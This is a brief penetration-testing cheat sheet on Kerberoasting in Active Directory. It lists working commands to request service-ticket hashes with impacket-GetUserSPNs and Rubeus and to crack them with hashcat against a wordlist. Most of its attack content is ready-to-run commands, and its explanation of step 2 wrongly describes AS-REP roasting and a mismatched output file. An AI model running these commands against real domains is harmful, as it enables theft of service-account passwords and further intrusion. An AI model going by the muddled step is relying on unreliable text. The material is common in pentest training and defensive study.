# Kerberoasting
This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`.
## **Perform Kerberoasting on Kali:**

1. **Command Syntax**: Use the following command to request the **TGS** (Ticket Granting Server) and capture the TGS-REP hash:
    
```bash
impacket-GetUserSPNs -request -dc-ip <DomainController_IP>  -outputfile <output_file> <Domain/User>
```
- **-request** to obtain the TGS
Example:
``` shell
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.50 corp.com/ahmed
```
HashShape
```
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$9b161bcb9f98f19b.......a85ee4
```

2. **Result**: This command will send AS-REQ requests to the domain controller and retrieve the AS-REP hashes (if preauthentication is disabled for the user accounts). The hashes are saved in [[Hashcat]] format in the output file (`hashes.asreproast`).
``` shell
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### **Perform Kerberoasting on Windows (joined domain):**
By using use [Rubeus]([https://github.com/GhostPack/Rubeus](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/tree/main/Tools/GhostPack-Compiled%20Binaries)) 

``` powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
